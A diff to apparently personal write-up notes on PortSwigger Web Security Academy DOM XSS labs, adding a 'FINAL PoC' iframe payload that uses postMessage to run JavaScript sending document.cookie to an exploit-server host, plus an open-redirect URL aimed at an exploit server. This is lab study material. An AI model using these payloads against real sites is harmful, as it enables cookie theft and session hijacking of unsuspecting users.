@@ -65,6 +65,12 @@ This script sends a web message containing an arbitrary JavaScript payload, alon
 
 When the iframe loads, the ``postMessage()`` method sends the JavaScript payload to the main page. The event listener spots the ``"http:``" string and proceeds to send the payload to the ``location.href`` sink, where the ``print()`` function is called.
 
+FINAL PoC:
+
+```html
+<iframe src="https://0a9a008604bbd8f2806a3a3900cd008f.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://exploit-0add004c04fad8fa804339f401ee0039.exploit-server.net/?kookie=`+document.cookie//http:','*')">
+```
+
 ## DOM XSS using web messages and JSON.parse
 Reference: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse
 
@@ -124,6 +130,7 @@ The blog post page contains the following link, which returns to the home page o
 ```html
 <a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
 ```
+
 The ``url`` parameter contains an open redirection vulnerability that allows you to change where the "Back to Blog" link takes the user. To solve the lab, construct and visit the following URL, remembering to change the URL to contain your lab ID and your exploit-server ID:
 ```
 https://your-lab-id.web-security-academy.net/post?postId=4&url=https://your-exploit-server-id.web-security-academy.net/
